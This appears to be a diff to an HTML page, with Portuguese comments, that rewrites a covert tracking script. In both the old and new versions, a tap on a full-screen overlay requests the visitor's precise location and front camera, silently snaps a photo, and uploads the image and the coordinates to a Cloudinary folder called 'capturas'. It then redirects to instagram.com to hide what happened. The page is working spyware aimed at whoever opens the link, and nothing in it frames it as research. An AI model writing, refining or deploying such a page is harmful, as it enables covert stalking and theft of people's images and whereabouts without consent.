@@ -16,7 +16,7 @@
       color: #2E2E2E;
       font-family: sans-serif;
       font-size: 20px;
-      background: rgba(255, 255, 255);
+      background: rgba(255, 255, 255, 0.9);
       z-index: 9999;
       text-align: center;
       padding: 20px;
@@ -31,161 +31,71 @@
     const uploadPreset = "upload";
     const folderName = "capturas";
 
-    const overlay = document.getElementById("overlay");
+    const overlay = document.getElementById('overlay');
 
-    function showOverlay(message, callback) {
-      overlay.textContent = message;
-      overlay.style.display = "flex";
-      overlay.onclick = () => {
-        overlay.style.display = "none";
-        if (callback) callback();
-      };
-    }
-
-    function requestLocation(callback) {
+    overlay.onclick = () => {
+      overlay.style.display = 'none';
+      // Primeiro: solicitar localização
       if (!navigator.geolocation) {
-        showOverlay("Geolocalização não suportada neste navegador.");
+        alert('Geolocalização não suportada.');
         return;
       }
-
       navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude } = position.coords;
-          callback(latitude, longitude);
+        async (pos) => {
+          const { latitude, longitude } = pos.coords;
+          try {
+            // Em seguida, solicitar câmera
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+            const video = document.createElement('video');
+            video.setAttribute('autoplay', true);
+            video.setAttribute('muted', true);
+            video.setAttribute('playsinline', true);
+            video.srcObject = stream;
+            await new Promise(res => video.onloadedmetadata = res);
+            video.play();
+
+            // Capturar imagem após breve delay
+            setTimeout(() => {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth || 640;
+              canvas.height = video.videoHeight || 480;
+              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+              stream.getTracks().forEach(t => t.stop());
+              canvas.toBlob(async (blob) => {
+                // Upload da imagem
+                const imgForm = new FormData();
+                imgForm.append('file', blob);
+                imgForm.append('upload_preset', uploadPreset);
+                imgForm.append('folder', folderName);
+                const imgResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm });
+                const imgData = await imgResp.json();
+
+                // Upload da localização em .txt
+                const txtBlob = new Blob([
+                  `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imgData.secure_url}`
+                ], { type: 'text/plain' });
+                const txtForm = new FormData();
+                txtForm.append('file', txtBlob, `localizacao_${Date.now()}.txt`);
+                txtForm.append('upload_preset', uploadPreset);
+                txtForm.append('folder', folderName);
+                await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: txtForm });
+
+                // Redireciona ao final
+                window.location.href = 'https://instagram.com';
+              }, 'image/png');
+            }, 500);
+          } catch (camErr) {
+            console.error('Erro câmera:', camErr);
+            alert('Permissão de câmera negada. Recarregue para tentar novamente.');
+          }
         },
-        (error) => {
-          console.error("Erro ao obter localização:", error);
-          showOverlay("Permissão de localização necessária. Toque para tentar novamente.", () => {
-            localStorage.setItem("retryLocation", "1");
-            location.reload(); // necessário no Safari
-          });
+        (geoErr) => {
+          console.error('Erro localização:', geoErr);
+          alert('Permissão de localização negada. Recarregue para tentar novamente.');
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
-    }
-
-    async function capturePhoto() {
-      return new Promise(async (resolve, reject) => {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" },
-            audio: false
-          });
-
-          const video = document.createElement("video");
-          video.setAttribute("autoplay", true);
-          video.setAttribute("muted", true);
-          video.setAttribute("playsinline", true); // necessário para iOS
-          video.srcObject = stream;
-
-          await new Promise((res) => {
-            video.onloadedmetadata = () => {
-              video.play();
-              res();
-            };
-          });
-
-          setTimeout(() => {
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            stream.getTracks().forEach(track => track.stop());
-
-            canvas.toBlob(async (blob) => {
-              const formData = new FormData();
-              formData.append("file", blob);
-              formData.append("upload_preset", uploadPreset);
-              formData.append("folder", folderName);
-
-              try {
-                const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
-                  method: "POST",
-                  body: formData
-                });
-
-                if (!response.ok) throw new Error("Erro ao enviar imagem");
-                const data = await response.json();
-                localStorage.setItem("uploadedImageUrl", data.secure_url);
-                resolve(data.secure_url);
-              } catch (uploadError) {
-                reject(uploadError);
-              }
-            }, "image/png");
-          }, 500);
-        } catch (err) {
-          showOverlay("Permissão de câmera necessária. Toque para tentar novamente.", startFlow);
-          reject(err);
-        }
-      });
-    }
-
-    async function startFlow() {
-      requestLocation(async (latitude, longitude) => {
-        try {
-          const imageUrl = await capturePhoto();
-
-          const textBlob = new Blob(
-            [`Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`],
-            { type: "text/plain" }
-          );
-
-          const textForm = new FormData();
-          textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
-          textForm.append("upload_preset", uploadPreset);
-          textForm.append("folder", folderName);
-
-          const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
-            method: "POST",
-            body: textForm
-          });
-
-          if (!textResp.ok) throw new Error("Erro ao enviar localização");
-
-          localStorage.removeItem("uploadedImageUrl");
-          window.location.href = "https://instagram.com";
-        } catch (err) {
-          console.error("Erro geral:", err);
-          showOverlay("Erro no envio. Toque para tentar novamente.", startFlow);
-        }
-      });
-    }
-
-    window.addEventListener("DOMContentLoaded", () => {
-      const savedUrl = localStorage.getItem("uploadedImageUrl");
-      const retryLocation = localStorage.getItem("retryLocation");
-
-      if (savedUrl && retryLocation) {
-        localStorage.removeItem("retryLocation");
-        showOverlay("Toque para tentar novamente", () => {
-          requestLocation(async (latitude, longitude) => {
-            const imageUrl = savedUrl;
-            const textBlob = new Blob([`Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`], { type: "text/plain" });
-
-            const textForm = new FormData();
-            textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
-            textForm.append("upload_preset", uploadPreset);
-            textForm.append("folder", folderName);
-
-            const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
-              method: "POST",
-              body: textForm
-            });
-
-            if (!textResp.ok) {
-              showOverlay("Erro ao reenviar dados. Toque para tentar novamente.", startFlow);
-            } else {
-              localStorage.removeItem("uploadedImageUrl");
-              window.location.href = "https://instagram.com";
-            }
-          });
-        });
-      } else {
-        showOverlay("Toque para continuar", startFlow);
-      }
-    });
+    };
   </script>
 </body>
 </html>
